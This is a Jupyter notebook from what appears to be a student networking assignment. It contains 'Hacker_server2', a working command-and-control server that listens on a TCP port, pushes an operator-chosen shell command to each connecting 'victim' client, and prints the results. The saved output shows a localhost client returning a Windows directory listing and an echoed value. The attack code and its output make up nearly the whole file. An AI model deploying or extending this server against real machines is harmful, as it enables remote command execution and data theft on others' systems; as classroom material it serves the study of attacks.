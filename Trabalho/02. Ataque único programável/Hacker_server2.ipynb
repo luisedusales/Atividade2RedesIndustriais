{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import subprocess\n",
    "import selectors\n",
    "import threading"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "command = \"dir\"\n",
    "def change_command():\n",
    "  global command\n",
    "  new_command = input(\"Input new command or press enter to keep current command(\"+command+\")\")\n",
    "  if len(new_command)>0:\n",
    "    print(\"New command:\", new_command)\n",
    "    command = new_command\n",
    "  return change_command()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "inputThread = threading.Thread(target=change_command)\n",
    "inputThread.daemon = True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "sel = selectors.DefaultSelector()\n",
    "def accept(sock, mask):\n",
    "    conn, addr = sock.accept()  # Should be ready\n",
    "    print('accepted', conn, 'from', addr)\n",
    "    conn.setblocking(False)\n",
    "    sel.register(conn, selectors.EVENT_READ, read)\n",
    "    conn.sendall(str.encode(command))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def read(conn, mask):\n",
    "    data = conn.recv(1024)  # Should be ready\n",
    "    if data:\n",
    "      print(repr(data))\n",
    "    else:\n",
    "      print('closing', conn)\n",
    "      sel.unregister(conn)\n",
    "      conn.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "SelectorKey(fileobj=<socket.socket fd=1284, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 10400)>, fd=1284, events=1, data=<function accept at 0x000001E63E940700>)"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HOST = ''\n",
    "PORT = 10400\n",
    "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "sock.bind((HOST, PORT))\n",
    "sock.listen(100)\n",
    "sock.setblocking(False)\n",
    "sel.register(sock, selectors.EVENT_READ, accept)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def run_server():\n",
    "  while True:\n",
    "    events = sel.select()\n",
    "    for key, mask in events:\n",
    "      callback = key.data\n",
    "      callback(key.fileobj, mask)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "accepted <socket.socket fd=804, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 10400), raddr=('127.0.0.1', 62335)> from ('127.0.0.1', 62335)\n",
      "b' O volume na unidade C n\\xc6o tem nome.\\r\\n O N\\xa3mero de S\\x82rie do Volume \\x82 E24F-8D8F\\r\\n\\r\\n Pasta de C:\\\\Users\\\\Acer\\\\OneDrive\\\\Documentos\\\\01. USP\\\\01 - Semestre Atual\\\\Redes\\\\Trabalho 2 - Lu\\xa1s\\\\Trabalho\\\\02. Ataque \\xa3nico program\\xa0vel\\r\\n\\r\\n29/11/2020  17:50    <DIR>          .\\r\\n29/11/2020  17:50    <DIR>          ..\\r\\n26/11/2020  17:33    <DIR>          .ipynb_checkpoints\\r\\n29/11/2020  17:46             3.817 Cliente_vitima2.ipynb\\r\\n29/11/2020  17:50             3.544 Hacker_server2.ipynb\\r\\n               2 arquivo(s)          7.361 bytes\\r\\n               3 pasta(s)   862.255.480.832 bytes dispon\\xa1veis\\r\\n'\n",
      "closing <socket.socket fd=804, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 10400), raddr=('127.0.0.1', 62335)>\n",
      "Input new command or press enter to keep current command(dir)echo 10333567\n",
      "New command: echo 10333567\n",
      "Input new command or press enter to keep current command(echo 10333567)"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Exception in thread Thread-6:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Users\\Acer\\anaconda3\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "    self.run()\n",
      "  File \"C:\\Users\\Acer\\anaconda3\\lib\\threading.py\", line 870, in run\n",
      "    self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-2-c828ecc28336>\", line 8, in change_command\n",
      "  File \"<ipython-input-2-c828ecc28336>\", line 4, in change_command\n",
      "EOFError: EOF when reading a line\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "accepted <socket.socket fd=1312, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 10400), raddr=('127.0.0.1', 62348)> from ('127.0.0.1', 62348)\n",
      "b'10333567\\r\\n'\n",
      "closing <socket.socket fd=1312, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 10400), raddr=('127.0.0.1', 62348)>\n"
     ]
    }
   ],
   "source": [
    "serverThread = threading.Thread(target=run_server)\n",
    "serverThread.start()\n",
    "inputThread.start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
